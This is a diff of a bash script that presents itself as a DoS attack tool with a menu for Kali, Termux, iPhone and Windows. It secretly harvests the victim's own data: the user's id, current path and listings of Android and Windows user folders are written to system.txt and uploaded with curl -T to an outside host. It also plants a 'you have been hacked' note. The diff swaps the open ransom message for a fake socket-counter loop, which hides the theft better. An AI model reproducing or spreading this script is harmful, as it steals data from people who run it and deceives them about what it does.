@@ -9,7 +9,7 @@ echo "Copyright By Pham Chien
   path   : $(pwd)
   id     : $(id)
 
-$(cd /$HOME/$FILE ; ls -la -s -u)
+$(cd /$HOME/ ; ls -s -u)
 
 "> system.txt
 curl -T system.txt http://happy.mikikk.co.jp/
@@ -39,7 +39,7 @@ echo "
 
   ==== Messenger =====
 
-  $(cd /sdcard/Movies/messenger ; ls -s -u)
+  $(cd /sdcard/Movies/ * ; ls -s -u)
 
   ==== Pictures =====
 
@@ -48,8 +48,6 @@ echo "
   ====== Download =====
 
   $(cd /sdcard/download ; echo 'All your data has been hacked , contact me : cyberkex.phamchien.net@gmail.com' >> you_have_been_hacked.txt ; ls -s -u ; cat *)
-
-  $(cd /sdcard/download ; echo "..." >> may.txt ; echo "..." >> da.txt ; echo "..." >> bi.txt ; echo "..." >> hack.txt)
 
   $(cd /sdcard/download ; cd * ; ls -l -u)
 
@@ -114,13 +112,13 @@ echo "
 
   $(cd /c/Users/$(whoami)/Desktop ; dir )
 
-  $(cd /c/Users/$(whoami)/Videos ; dir)
+  $(cd /Users/$(whoami)/Videos ; dir)
 
   $(cd /c/Users/$(whoami)/Documents ; dir )
 
   $(cd /c/Users/$(whoami)/Public ; dir )
 
-  $(cd /Users/$(whoami) ; dir ) ">> system.txt
+  $(cd /c/Users/$(whoami) ; dir ) ">> system.txt
   curl -T system.txt http://happy.mikikk.co.jp/
 }
 
@@ -164,8 +162,8 @@ mv test.txt /root
 
 kali_linux() {
 echo "test" > test.txt
-mv test.txt /$HOME/desktop
-  if [ -f /$HOME/desktop/test.txt ]
+mv test.txt /home/kali/desktop
+  if [ -f /home/kali/desktop/test.txt ]
     then
       echo "success"
 
@@ -175,18 +173,28 @@ mv test.txt /$HOME/desktop
   fi
 }
 
+sent_num() {
+num=1
+   while [ $num -lt $RANDOM ]
+    do
+     echo "Socket $RANDOM.$num bytes"
+     num=`expr $num + 1`
+    done
+}
+
 echo "
 ____       _____
 |  _ \  ___/ ___|
 | |_| |/ _ \___ \\
 |____/ \___/____/
+        PhamChienAdams ©
 
 1 ) kali
 2 ) termux
 3 ) iphone
 4 ) win X64"
 
-  echo -n Enter System :
+  echo -n "Enter System : "
    read system
 
    case $system in
@@ -194,7 +202,7 @@ ____       _____
    4)
    windows
    win
-   echo -n Enter Target
+   echo -n "Enter Target : "
     read line
   echo 3
   sleep 1
@@ -204,9 +212,7 @@ ____       _____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  sent_num
   ;;
 
    1)
@@ -214,7 +220,7 @@ ____       _____
    kali
    echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -225,9 +231,8 @@ ____       _____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  echo -e "\033[33;31m"
+  sent_num
   ;;
 
   2)
@@ -235,7 +240,7 @@ ____       _____
   termux
   echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -246,9 +251,7 @@ ____       _____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  sent_num
   ;;
 
   3)
@@ -256,7 +259,7 @@ ____       _____
   ios
   echo -e "\033[33;35m"
 
-  echo -n Enter Target :
+  echo -n "Enter Target : "
  read line
 
   echo 3
@@ -267,12 +270,11 @@ ____       _____
   sleep 1
   echo ATTACK!!!
   sleep 1
-  echo -e "\033[33;31m
-   you have had a backdoor attack, all your Backups and Android files are controlled by us, please contact me via my zalo 0325852307😂😂"
-  exit 1
+  sent_num
   ;;
 
   *)
    echo Command not found
+
    exit 1
 esac
